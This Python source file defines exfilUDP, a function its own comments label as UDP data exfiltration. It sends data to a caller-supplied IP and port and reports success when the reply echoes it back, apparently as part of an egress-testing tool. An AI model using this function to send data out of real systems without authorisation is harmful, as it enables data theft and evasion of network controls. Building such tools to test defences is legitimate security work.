import logging
import socket

# exfiltrate data over UDP
def exfilUDP(ip, port, data):
    logging.debug("Using UDP exfiltration")
    if isinstance(data, list):
        logging.debug("data is a list, converting to string")
        data = ','.join(data)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    port = int(port)

    server_address = (ip, port)
    good_echo = False
    recv_msg = ""

    try:
        logging.debug(f'Sending data to {ip} on port {port} over UDP')
        sent = sock.sendto(data.encode('utf-8'), server_address)
        logging.debug(f'Sent {sent} bytes to {ip} on port {port} over UDP')
        recv, server = sock.recvfrom(4096)
        recv_msg = recv
        logging.debug(f'Received {len(recv)} bytes from {ip} on port {port} over UDP')
        if recv_msg == data.encode('utf-8'):
            logging.debug(f'Got echo from {ip} on port {port} over UDP')
            good_echo = True

    except Exception as e:
        logging.error(f"Failed to send or receive UDP Data: {e}")
        return {
            "good": False,
            "recv": None,
            "err": f"Failed to send or receive UDP Data: {e}"
        }

    logging.debug("UDP exfiltration successful!")
    return {
        "good": good_echo,
        "recv": recv_msg.decode('utf-8'),
        "err": None
    }